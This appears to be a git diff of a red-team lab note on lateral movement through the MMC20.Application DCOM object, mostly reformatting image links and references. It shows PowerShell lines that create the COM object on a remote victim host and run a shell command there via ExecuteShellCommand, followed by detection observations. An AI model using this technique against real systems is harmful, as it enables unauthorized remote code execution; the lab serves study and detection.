@@ -1,5 +1,6 @@
 ---
 description: Lateral Movement via Distributed Component Object Model
+tags: [#lateral-movement]
 ---
 
 # Lateral Movement via DCOM
@@ -14,7 +15,7 @@ This lab explores a DCOM lateral movement technique using MMC20.Application COM 
 
 MMC20.Application COM class is stored in the registry as shown below:
 
-![](../../.gitbook/assets/dcom-registry.png)
+![[dcom-registry.png]]
 
 Same can be achieved with powershell:
 
@@ -22,27 +23,25 @@ Same can be achieved with powershell:
 Get-ChildItem 'registry::HKEY_CLASSES_ROOT\WOW6432Node\CLSID\{49B2791A-B1AE-4C90-9B8E-E860BA07F889}'
 ```
 
-![](../../.gitbook/assets/dcom-registry2.png)
+![[dcom-registry2.png]]
 
 Establishing a connection to the victim host:
 
-{% code title="attacker@victim" %}
 ```csharp
+// attacker@victim
 $a = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","10.0.0.2"))
 ```
-{% endcode %}
 
 Executing command on the victim system via DCOM object:
 
-{% code title="attacker@victim" %}
 ```csharp
+// attacker@victim
 $a.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c hostname > c:\fromdcom.txt","7")
 ```
-{% endcode %}
 
 Below shows the command execution and the result of it - remote machine's `hostname` command output is written to `c:\fromdcom.txt`:
 
-![](<../../.gitbook/assets/dcom-rce (1).png>)
+![[dcom-rce (1).png]]
 
 ## Observations
 
@@ -54,26 +53,26 @@ Once the connection from an attacker to victim is established using the below po
 
 This is what happens on the victim system - `svchost` spawns `mmc.exe` which opens a listening port via RPC binding:
 
-![](../../.gitbook/assets/dcom-mmc-bind.png)
+![[dcom-mmc-bind.png]]
 
-![](../../.gitbook/assets/dcom-listening.png)
+![[dcom-listening.png]]
 
-![](../../.gitbook/assets/dcom-ancestry+connections.png)
+![[dcom-ancestry+connections.png]]
 
 A network connection is logged from 10.0.0.7 (attacker) to 10.0.0.2 (victim) via `offense\administrator` (can be also seen from the above screenshot):
 
-![](../../.gitbook/assets/dcom-logon-event.png)
+![[dcom-logon-event.png]]
 
-![](../../.gitbook/assets/dcom-connection2.png)
+![[dcom-connection2.png]]
 
 ## References
 
-{% embed url="https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/" %}
+[enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
 
-{% embed url="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand" %}
+[docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand)
 
-{% embed url="https://docs.microsoft.com/en-us/dotnet/api/system.type.gettypefromclsid?view=netframework-4.7.2#System_Type_GetTypeFromCLSID_System_Guid_System_String_" %}
+[docs.microsoft.com/en-us/dotnet/api/system.type.gettypefromclsid?view=netframework-4.7.2#System_Type_GetTypeFromCLSID_System_Guid_System_String_](https://docs.microsoft.com/en-us/dotnet/api/system.type.gettypefromclsid?view=netframework-4.7.2#System_Type_GetTypeFromCLSID_System_Guid_System_String_)
 
-{% embed url="https://docs.microsoft.com/en-us/windows/desktop/com/com-technical-overview" %}
+[docs.microsoft.com/en-us/windows/desktop/com/com-technical-overview](https://docs.microsoft.com/en-us/windows/desktop/com/com-technical-overview)
 
-{% embed url="https://attack.mitre.org/wiki/Technique/T1175" %}
+[attack.mitre.org/wiki/Technique/T1175](https://attack.mitre.org/wiki/Technique/T1175)
